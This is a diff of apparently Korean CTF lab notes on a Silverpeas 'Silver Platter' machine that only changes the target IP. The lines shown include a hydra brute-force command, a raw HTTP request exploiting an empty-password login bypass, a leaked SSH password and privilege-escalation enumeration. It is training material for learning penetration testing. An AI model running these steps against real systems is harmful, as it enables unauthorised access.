@@ -243,14 +243,14 @@ Date: Wed, 16 Jul 2025 14:38:56 GMT
 
 # 힌트 기반으로 시도 -> 새로운 페이지 열림 -> 인트라넷이라고 나옴
 
-http://10.10.156.119:8080/silverpeas/defaultLogin.jsp
+http://10.10.157.2:8080/silverpeas/defaultLogin.jsp
 
 - 로그인 테스트
-  http://10.10.156.119:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1
+  http://10.10.157.2:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1
 
 # hydra 로그인 프루브 포싱
 
-hydra -l scr1ptkiddy -P passwords.txt 10.10.156.119 http-post-form \
+hydra -l scr1ptkiddy -P passwords.txt 10.10.157.2 http-post-form \
 "/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"
 
 # Google CEV 발견 -> scr1ptkiddy 로그인 시 password 없이 로그인 가능
@@ -260,16 +260,16 @@ hydra -l scr1ptkiddy -P passwords.txt 10.10.156.119 http-post-form \
 ![](https://velog.velcdn.com/images/agnusdei1207/post/9283f92b-10a8-4cf3-958a-c34c16a86502/image.png)
 
 POST /silverpeas/AuthenticationServlet HTTP/1.1
-Host: 10.10.156.119:8080
+Host: 10.10.157.2:8080
 Content-Length: 38
 Cache-Control: max-age=0
 Accept-Language: en-US,en;q=0.9
-Origin: http://10.10.156.119:8080
+Origin: http://10.10.157.2:8080
 Content-Type: application/x-www-form-urlencoded
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://10.10.156.119:8080/silverpeas/defaultLogin.jsp
+Referer: http://10.10.157.2:8080/silverpeas/defaultLogin.jsp
 Accept-Encoding: gzip, deflate, br
 Cookie: JSESSIONID=ynxIq7QIzMeWyFR1tQ1FZCq9e9DT0Ks1TlnSIJn2.ebabc79c6d2a
 Connection: keep-alive
@@ -279,13 +279,13 @@ Login=scr1ptkiddy&Password=&DomainId=0
 # scr1ptkiddy 인증 됨
 
 GET /silverpeas/Main//look/jsp/MainFrame.jsp HTTP/1.1
-Host: 10.10.156.119:8080
+Host: 10.10.157.2:8080
 Cache-Control: max-age=0
 Accept-Language: en-US,en;q=0.9
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://10.10.156.119:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=2
+Referer: http://10.10.157.2:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=2
 Accept-Encoding: gzip, deflate, br
 Cookie: JSESSIONID=ynxIq7QIzMeWyFR1tQ1FZCq9e9DT0Ks1TlnSIJn2.ebabc79c6d2a; defaultDomain=0; svpLogin=scr1ptkiddy
 Connection: keep-alive
@@ -294,7 +294,7 @@ Connection: keep-alive
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/f8600306-85aa-419e-b879-576bf18e81c8/image.png)
 
-http://10.10.156.119:8080/silverpeas/look/jsp/MainFrame.jsp
+http://10.10.157.2:8080/silverpeas/look/jsp/MainFrame.jsp
 
 # silveradmin@localhost
 
@@ -319,7 +319,7 @@ Username: tim
 
 Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
 
-# ssh tim@10.10.156.119 -> SSH 접속 성공
+# ssh tim@10.10.157.2 -> SSH 접속 성공
 
 tim@silver-platter:~$ ls
 user.txt
@@ -371,7 +371,7 @@ tim@silver-platter:~$ find / -perm -4000 -type f -executable -exec ls -l {} \; 2
 
 # snap/core 는 특정 OS 를 스냅샷 저장한 걸로 보임
 
-# 정보 수집 -> adm 그룹에 속해있음
+# 정보 수집 -> adm 그룹에 속해있음 -> adm 은 일반적으로 /var/log 로그파일에 접근할 수 있는 권한이 있음
 
 tim@silver-platter:~$ id
 uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
